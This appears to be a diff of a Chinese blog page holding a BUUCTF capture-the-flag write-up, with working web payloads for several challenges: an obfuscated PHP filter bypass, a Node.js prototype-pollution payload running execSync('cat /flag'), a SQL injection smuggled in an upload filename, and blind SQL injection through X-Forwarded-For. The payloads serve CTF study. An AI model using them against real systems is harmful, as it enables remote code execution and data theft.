@@ -1,392 +1,70 @@
-<!DOCTYPE HTML>
-<html lang="zh-CN">
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png?v=2.6.2" sizes="180x180"><link rel="mask-icon" href="/images/icons/stun-logo.svg?v=2.6.2" color="#54bcff"><meta name="msapplication-TileImage" content="/images/icons/favicon-144x144.png"><meta name="msapplication-TileColor" content="#000000"><meta name="baidu-site-verification" content="code-15zD58SrOe"><meta name="description" content="BUU第二份">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF记录2">
+<meta property="og:url" content="http://jlan.darkflow.top/posts/210d3ac7.html">
+<meta property="og:site_name" content="J1an&#39;s Little World">
+<meta property="og:description" content="BUU第二份">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/20220526230030.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202205281141102.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011611789.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206011632778.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020934705.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206020935563.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206021103197.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061819430.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061821510.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061823346.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061829146.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061833299.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206061843021.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206111752709.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141634553.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206141718491.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151413306.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181014005442-ae5afd28-cf08-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20181014005518-c376b332-cf08-1.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206151820591.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162052551.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162053572.png">
+<meta property="og:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206162055573.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/70ea2b9eee5c499f9bc3aa29c3ac94f7.png">
+<meta property="article:published_time" content="2022-05-26T07:23:54.000Z">
+<meta property="article:modified_time" content="2022-10-25T16:40:59.190Z">
+<meta property="article:author" content="J1an">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jlan-blog.oss-cn-beijing.aliyuncs.com/20220526230030.png"><title>BUUCTF记录2 | J1an's Little World</title><link ref="canonical" href="http://jlan.darkflow.top/posts/210d3ac7.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":true},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"carbon","highlight":"dark","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: {"avoidBanner":false},
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
 
-
-<head>
-    <meta charset="utf-8">
-    <meta name="keywords" content="BUUCTF记录2, J1an&#39;s Little World">
-    <meta name="description" content="BUU第二份
-
-
-[ISITDTU 2019]EasyPHP&amp;lt;?php
-highlight_file(__FILE__);
-
-$_ = @$_GET[&#39;_&#39;];
-if ( preg_match(&#39;/[\x00- 0-9\&#39;&#34;`$&amp;am">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <meta name="renderer" content="webkit|ie-stand|ie-comp">
-    <meta name="mobile-web-app-capable" content="yes">
-    <meta name="format-detection" content="telephone=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <meta name="referrer" content="no-referrer-when-downgrade">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-
-
-    <title>BUUCTF记录2 | J1an&#39;s Little World</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
-    
-
-
-    <!-- bg-cover style     -->
-
-
-
-<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
-<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
-<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
-<link rel="stylesheet" type="text/css" href="/css/matery.css">
-<link rel="stylesheet" type="text/css" href="/css/my.css">
-<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
-
-
-
-
-    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
-    <link rel="stylesheet" href="/css/post.css">
-
-
-
-
-    
-
-
-
-    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
-
-<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="J1an's Little World" type="application/atom+xml">
-</head>
-
-
-<body>
-    <header class="navbar-fixed">
-    <nav id="headNav" class="bg-color nav-transparent">
-        <div id="navContainer" class="nav-wrapper container">
-            <div class="brand-logo">
-                <a href="/" class="waves-effect waves-light">
-                    
-                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
-                    
-                    <span class="logo-span">J1an&#39;s Little World</span>
-                </a>
-            </div>
-            
-
-<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
-<ul class="right nav-menu">
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/" class="waves-effect waves-light">
-      
-      <i class="fas fa-home" style="zoom: 0.6;"></i>
-      
-      <span>首页</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/tags" class="waves-effect waves-light">
-      
-      <i class="fas fa-tags" style="zoom: 0.6;"></i>
-      
-      <span>标签</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/categories" class="waves-effect waves-light">
-      
-      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
-      
-      <span>分类</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/archives" class="waves-effect waves-light">
-      
-      <i class="fas fa-archive" style="zoom: 0.6;"></i>
-      
-      <span>归档</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/about" class="waves-effect waves-light">
-      
-      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
-      
-      <span>关于</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
-    <a href="/friends" class="waves-effect waves-light">
-      
-      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
-      
-      <span>友情链接</span>
-    </a>
-    
-  </li>
-  
-  <li>
-    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
-      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-  <li>
-    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
-      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
-    </a>
-  </li>
-</ul>
-
-
-<div id="mobile-nav" class="side-nav sidenav">
-
-    <div class="mobile-head bg-color">
-        
-        <img src="/medias/logo.png" class="logo-img circle responsive-img">
-        
-        <div class="logo-name">J1an&#39;s Little World</div>
-        <div class="logo-desc">
-            
-            Never really desperate, only the lost of the soul.
-            
-        </div>
-    </div>
-
-    <ul class="menu-list mobile-menu-list">
-        
-        <li class="m-nav-item">
-	  
-		<a href="/" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-home"></i>
-			
-			首页
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/tags" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-tags"></i>
-			
-			标签
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/categories" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-bookmark"></i>
-			
-			分类
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/archives" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-archive"></i>
-			
-			归档
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/about" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-user-circle"></i>
-			
-			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/friends" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-address-book"></i>
-			
-			友情链接
-		</a>
-          
-        </li>
-        
-        
-        <li><div class="divider"></div></li>
-        <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
-                <i class="fab fa-github-square fa-fw"></i>Fork Me
-            </a>
-        </li>
-        
-    </ul>
-</div>
-
-
-        </div>
-
-        
-            <style>
-    .nav-transparent .github-corner {
-        display: none !important;
-    }
-
-    .github-corner {
-        position: absolute;
-        z-index: 10;
-        top: 0;
-        right: 0;
-        border: 0;
-        transform: scale(1.1);
-    }
-
-    .github-corner svg {
-        color: #0f9d58;
-        fill: #fff;
-        height: 64px;
-        width: 64px;
-    }
-
-    .github-corner:hover .octo-arm {
-        animation: a 0.56s ease-in-out;
-    }
-
-    .github-corner .octo-arm {
-        animation: none;
-    }
-
-    @keyframes a {
-        0%,
-        to {
-            transform: rotate(0);
-        }
-        20%,
-        60% {
-            transform: rotate(-25deg);
-        }
-        40%,
-        80% {
-            transform: rotate(10deg);
-        }
-    }
-</style>
-
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
-   data-tooltip="Fork Me" data-position="left" data-delay="50">
-    <svg viewBox="0 0 250 250" aria-hidden="true">
-        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
-        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
-              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
-        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
-              fill="currentColor" class="octo-body"></path>
-    </svg>
-</a>
-        
-    </nav>
-
-</header>
-
-    
-
-
-
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
-    <div class="container" style="right: 0px;left: 0px;">
-        <div class="row">
-            <div class="col s12 m12 l12">
-                <div class="brand">
-                    <h1 class="description center-align post-title">BUUCTF记录2</h1>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-
-
-
-<main class="post-container content">
-
-    
-    <div class="row">
-    <div id="main-content" class="col s12 m12 l9">
-        <!-- 文章内容详情 -->
-<div id="artDetail">
-    <div class="card">
-        <div class="card-content article-info">
-            <div class="row tag-cate">
-                <div class="col s7">
-                    
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
-                    
-                </div>
-                <div class="col s5 right-align">
-                    
-                </div>
-            </div>
-
-            <div class="post-info">
-                
-                <div class="post-date info-break-policy">
-                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-05-26
-                </div>
-                
-
-                
-
-                
-
-                
-
-                
-            </div>
-        </div>
-        <hr class="clearfix">
-
-        
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
-        
-
-        
-
-        <div class="card-content article-card-content">
-            <div id="articleContent">
-                <p>BUU第二份</p>
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="J1an's Little World" type="application/atom+xml">
+</head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/links/"><span class="header-nav-menu-item__icon"><i class="fas fa-user-friends"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">J1an's Little World</div><div class="header-banner-info__subtitle">欢迎来学习知识</div></div><div class="header-banner-arrow"><div class="header-banner-arrow__icon"><i class="fas fa-angle-down"></i></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">BUUCTF记录2</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-05-26</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-10-26</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/210d3ac7.html" data-flag-title="BUUCTF记录2"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value leancloud-visitors-count"></span></span><span class="post-meta-item post-meta-item--visitors"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">阅读次数</span><span class="post-meta-item__value" id="busuanzi_value_page_pv"></span></span></div></header><div class="post-body"><p>BUU第二份</p>
 <span id="more"></span>
 
-<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+        <h2 id="ISITDTU-2019-EasyPHP"   >
+          <a href="#ISITDTU-2019-EasyPHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2>
+      <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 <span class="token variable">$_</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
@@ -401,7 +79,7 @@ if ( preg_match(&#39;/[\x00- 0-9\&#39;&#34;`$&amp;am">
 
 <p><code>strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd</code></p>
 <p>先看这个判断，count_chars函数用法如下</p>
-<table>
+<div class="table-container"><table>
 <thead>
 <tr>
 <th align="left">参数</th>
@@ -416,11 +94,11 @@ if ( preg_match(&#39;/[\x00- 0-9\&#39;&#34;`$&amp;am">
 <td align="left"><em>mode</em></td>
 <td align="left">可选。规定返回模式。默认是 0。有以下不同的返回模式：<br />0 - 数组，ASCII 值为键名，出现的次数为键值1 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数大于 0 的值<br />2 - 数组，ASCII 值为键名，出现的次数为键值，只列出出现次数等于 0 的值<br />3 - 字符串，带有所有使用过的不同的字符<br />4 - 字符串，带有所有未使用过的不同的字符</td>
 </tr>
-</tbody></table>
+</tbody></table></div>
 <p>那么上述判断条件就是要保证传入的数据中有不多于13中不同的字符，先使用phpinfo查看信息</p>
 <pre class="line-numbers language-none"><code class="language-none">?.&#x3D;(~%8F%97%8F%96%91%99%90)();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>![](<a target="_blank" rel="noopener" href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-26">https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-26</a> 15.30.06.png)</p>
+<p>![](<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-26" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-26</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 15.30.06.png)</p>
 <p>可以使用scandir来扫描文件，构建payload：<code>print_r(scandir(&#39;.&#39;))</code></p>
 <p>使用异或脚本生成</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span><span class="token operator">=</span><span class="token string">"print_r"</span>
@@ -467,8 +145,11 @@ scandir&#x3D;((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%f
 <p>真·最终payload</p>
 <pre class="line-numbers language-none"><code class="language-none">?.&#x3D;((%8D%9A%9E%9B%99%96%93%9A)^(%FF%FF%FF%FF%FF%FF%FF%FF))(((%9A%9E%9B)^(%FF%99%FF)^(%FF%96%FF)^(%FF%FF%FF))(((%8D%9E%9E%9E%9B%96%8D)^(%9A%9B%FF%99%FF%FF%FF)^(%9B%99%FF%96%FF%FF%FF)^(%FF%FF%FF%FF%FF%FF%FF))(%D1^%FF)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>本题触及知识盲区，乖乖学习node.js去咯</p>
-<p>首先还是要了解一下node.js，通俗意义上理解就是javascript的后端版本，所以基本上语法是和javascript一样的，这里贴个大佬的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12659738.html">node.js相关安全问题总结</a>，然后就是这道题了，是node.js的原型链污染</p>
+
+        <h2 id="GYCTF2020-Ez-Express"   >
+          <a href="#GYCTF2020-Ez-Express" class="heading-link"><i class="fas fa-link"></i></a><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2>
+      <p>本题触及知识盲区，乖乖学习node.js去咯</p>
+<p>首先还是要了解一下node.js，通俗意义上理解就是javascript的后端版本，所以基本上语法是和javascript一样的，这里贴个大佬的<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/12659738.html" >node.js相关安全问题总结</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>，然后就是这道题了，是node.js的原型链污染</p>
 <p><strong>node.js的原型链污染</strong></p>
 <p>在js中万物皆对象，而在js我们如果想要定义一个类的话就需要使用类似于构造函数的方式来构造</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -512,7 +193,7 @@ foo<span class="token punctuation">.</span><span class="token function">show</sp
 <p>以上全是知识，正式开始做题</p>
 <p>首先就是这个</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/20220526230030.png"></p>
-<p>用admın经过<code>toUpperCase</code>处理后变成ADMIN，进去之后没啥头绪，扫个目录吧，<a target="_blank" rel="noopener" href="http://www.zip拿到源码,可以看到res中的outputfunctionname属性为空,可以进行污染,并且在info中直接获得的就是outputfunctionname中的内容/">www.zip拿到源码，可以看到res中的outputFunctionName属性为空，可以进行污染，并且在info中直接获得的就是outputFunctionName中的内容</a></p>
+<p>用admın经过<code>toUpperCase</code>处理后变成ADMIN，进去之后没啥头绪，扫个目录吧，<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.zip拿到源码,可以看到res中的outputfunctionname属性为空,可以进行污染,并且在info中直接获得的就是outputfunctionname中的内容/" >www.zip拿到源码，可以看到res中的outputFunctionName属性为空，可以进行污染，并且在info中直接获得的就是outputFunctionName中的内容</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -541,7 +222,10 @@ foo<span class="token punctuation">.</span><span class="token function">show</sp
 &#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a&#x3D;1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;)&#x2F;&#x2F;&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>再访问info即可获取flag</p>
-<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>传文件，试后缀，扫目录都不行，看源码</p>
+
+        <h2 id="安洵杯-2019-不是文件上传"   >
+          <a href="#安洵杯-2019-不是文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2>
+      <p>传文件，试后缀，扫目录都不行，看源码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">helper</span> <span class="token punctuation">&#123;</span>
 	<span class="token keyword">protected</span> <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"pic/"</span><span class="token punctuation">;</span>
@@ -763,8 +447,14 @@ foo<span class="token punctuation">.</span><span class="token function">show</sp
 文件名：
 1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d)#.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="极客大挑战-2020-Roamphp1-Welcome"><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2><p>405换POST，<code>roam1[]=1&amp;roam2[]=2</code></p>
-<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>看源码，发现注释中存在我们的信息，存在Last IP，应该是被写入了数据库，尝试在X-Forward-For处构造payload，确实存在，使用<code>1&#39; or &#39;1</code>进行测试，发现返回的Last IP变成了1，说明存在SQL注入，构造语句</p>
+
+        <h2 id="极客大挑战-2020-Roamphp1-Welcome"   >
+          <a href="#极客大挑战-2020-Roamphp1-Welcome" class="heading-link"><i class="fas fa-link"></i></a><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2>
+      <p>405换POST，<code>roam1[]=1&amp;roam2[]=2</code></p>
+
+        <h2 id="RoarCTF-2019-Online-Proxy"   >
+          <a href="#RoarCTF-2019-Online-Proxy" class="heading-link"><i class="fas fa-link"></i></a><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2>
+      <p>看源码，发现注释中存在我们的信息，存在Last IP，应该是被写入了数据库，尝试在X-Forward-For处构造payload，确实存在，使用<code>1&#39; or &#39;1</code>进行测试，发现返回的Last IP变成了1，说明存在SQL注入，构造语句</p>
 <pre class="line-numbers language-none"><code class="language-none">0&#39; or if() or &#39;0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>这样在结果正确时就会返回1</p>
@@ -827,7 +517,10 @@ res <span class="token operator">=</span> <span class="token string">''</span>
 <span class="token comment">#F4l9_t4b1e</span>
 <span class="token comment">#F4l9_C01uMn</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>传图片马不通过估计是因为<code>getimagesize</code>没有拿到大小信息，自己搞一个就行，上传发现啥也没得，就换了个头像，看源码咯</p>
+
